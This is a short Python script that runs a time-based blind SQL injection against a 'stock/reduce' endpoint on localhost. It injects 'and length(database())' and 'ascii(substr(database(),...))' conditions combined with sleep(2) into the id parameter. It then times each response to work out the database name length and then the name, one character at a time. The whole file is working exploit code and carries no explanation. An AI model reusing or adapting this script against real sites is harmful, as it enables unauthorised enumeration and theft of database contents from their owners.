import requests;
import time;

def getDatabaseLength():
    for i in range(1,20):
        url = 'http://localhost:8888/stock/reduce?id=1 and length(database())=%d and sleep(2)'%(i)
        startTime = time.time()
        requests.get(url)
        endTime=time.time()
        if endTime - startTime > 1:
            print('length is => ',i)
            return i

def getDatabaseName():
    databaseName = ''
    databaseLength = getDatabaseLength()
    for i in range(1, databaseLength + 1):
        for asci in range(33,128):
            url = 'http://localhost:8888/stock/reduce?id=1 and ascii(substr(database(),%d,1))=%d and sleep(2)'%(i,asci)
            startTime = time.time()
            requests.get(url)
            endTime=time.time()
            if endTime - startTime > 1:
                # print(chr(asci))
                databaseName = databaseName + chr(asci)
                break
    print('database name is => ', databaseName)


if __name__ == "__main__":
    getDatabaseName()
